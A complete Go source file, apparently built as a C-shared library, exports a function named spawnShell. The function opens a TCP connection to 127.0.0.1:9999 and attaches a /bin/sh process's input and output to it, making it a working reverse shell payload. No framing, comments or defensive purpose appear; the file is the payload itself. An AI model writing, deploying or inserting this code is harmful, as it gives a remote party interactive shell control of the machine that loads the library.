package main

import (
	"C"
	"net"
	"os/exec"
)

//export spawnShell
func spawnShell() {
	conn,_ := net.Dial("tcp", "127.0.0.1:9999")
	cmd := exec.Command("/bin/sh")
	cmd.Stdin=conn
	cmd.Stdout=conn
	cmd.Stderr=conn
	cmd.Run()
}

func main() {}
